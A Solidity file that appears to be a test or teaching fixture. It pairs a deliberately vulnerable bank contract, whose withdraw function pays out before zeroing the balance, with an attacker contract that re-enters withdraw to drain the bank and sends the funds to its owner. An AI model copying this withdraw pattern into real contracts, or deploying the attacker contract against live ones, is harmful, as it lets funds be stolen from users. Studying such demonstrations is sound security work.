// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title VulnerableBank
 * @notice This contract is intentionally vulnerable for testing purposes.
 * @dev Contains a classic reentrancy vulnerability.
 */
contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    
    /**
     * @notice Deposit ETH into the bank
     */
    function deposit() public payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    /**
     * @notice Withdraw all deposited ETH
     * @dev VULNERABLE: State update happens after external call
     */
    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance to withdraw");
        
        // VULNERABILITY: External call before state update
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
        
        // State update happens AFTER the external call
        // An attacker can re-enter before this line executes
        balances[msg.sender] = 0;
        
        emit Withdrawal(msg.sender, balance);
    }
    
    /**
     * @notice Get contract balance
     */
    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title AttackerContract
 * @notice Demonstrates how to exploit the reentrancy vulnerability
 */
contract AttackerContract {
    VulnerableBank public vulnerableBank;
    address public owner;
    
    constructor(address _bankAddress) {
        vulnerableBank = VulnerableBank(_bankAddress);
        owner = msg.sender;
    }
    
    /**
     * @notice Initiates the attack
     */
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        
        // Deposit some ETH first
        vulnerableBank.deposit{value: msg.value}();
        
        // Start the attack by withdrawing
        vulnerableBank.withdraw();
    }
    
    /**
     * @notice Fallback function that re-enters the withdraw function
     */
    receive() external payable {
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw();
        }
    }
    
    /**
     * @notice Collect stolen funds
     */
    function collectFunds() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
}
